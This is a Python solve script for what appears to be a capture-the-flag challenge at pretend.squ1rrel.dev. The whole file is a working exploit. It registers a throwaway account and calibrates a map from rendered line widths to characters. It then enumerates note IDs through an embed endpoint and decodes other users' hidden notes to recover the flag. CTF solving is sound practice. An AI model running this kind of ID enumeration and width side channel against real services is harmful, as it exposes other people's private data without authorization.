#!/usr/bin/env python3

from __future__ import annotations

import secrets
import string
from collections import defaultdict

import requests


BASE_URL = "https://pretend.squ1rrel.dev"
PRINTABLE = "".join(chr(codepoint) for codepoint in range(33, 127))


def width_key(value: float) -> str:
    return f"{value:.2f}"


def api(session: requests.Session, method: str, path: str, **kwargs):
    response = session.request(method, BASE_URL + path, timeout=20, **kwargs)
    response.raise_for_status()
    return response.json()


def register_throwaway(session: requests.Session) -> None:
    username = "u" + secrets.token_hex(4)
    password = "pw" + secrets.token_hex(4)
    api(
        session,
        "POST",
        "/api/register",
        json={"username": username, "password": password},
    )


def create_calibration_map(session: requests.Session) -> dict[str, str]:
    note = api(
        session,
        "POST",
        "/api/notes",
        json={"title": "calibration", "content": PRINTABLE},
    )
    embed = api(session, "GET", f"/api/notes/{note['id']}/embed?width=1")

    width_to_chars: dict[str, list[str]] = defaultdict(list)
    for character, line in zip(PRINTABLE, embed["lines"], strict=True):
        width_to_chars[width_key(line["width"])].append(character)

    unique_map = {}
    for key, characters in width_to_chars.items():
        if len(characters) == 1:
            unique_map[key] = characters[0]
    return unique_map


def decode_note(session: requests.Session, note_id: int, width_map: dict[str, str]) -> str | None:
    response = session.get(f"{BASE_URL}/api/notes/{note_id}/embed?width=1", timeout=20)
    if response.status_code == 404:
        return None
    response.raise_for_status()
    data = response.json()

    decoded = []
    for line in data["lines"]:
        character = width_map.get(width_key(line["width"]))
        if character is None:
            return None
        decoded.append(character)
    return "".join(decoded)


def find_flag(session: requests.Session, width_map: dict[str, str]) -> str:
    for note_id in range(1, 200):
        decoded = decode_note(session, note_id, width_map)
        if decoded and decoded.startswith("squ1rrel{") and decoded.endswith("}"):
            return decoded
    raise RuntimeError("Flag note not found")


def main() -> int:
    session = requests.Session()
    register_throwaway(session)
    width_map = create_calibration_map(session)
    flag = find_flag(session, width_map)
    print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())